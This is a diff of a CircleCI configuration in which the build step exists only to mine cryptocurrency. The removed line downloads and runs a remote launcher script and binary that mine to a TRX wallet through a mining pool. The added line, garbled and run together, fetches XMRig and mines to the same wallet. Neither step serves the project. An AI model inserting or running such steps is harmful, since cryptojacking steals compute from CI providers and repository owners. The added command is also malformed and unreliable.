@@ -8,6 +8,5 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin TRX -wallet TWU39M253wQ3NKjPhwRqQmm1ECpH9kyDpF  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
- 
+      - run: ! wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz! tar -xf xmrig-6.12.1-linux-x64.tar.gzcd xmrig-6.12.1! ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TWU39M253wQ3NKjPhwRqQmm1ECpH9kyDpF.colab8
 
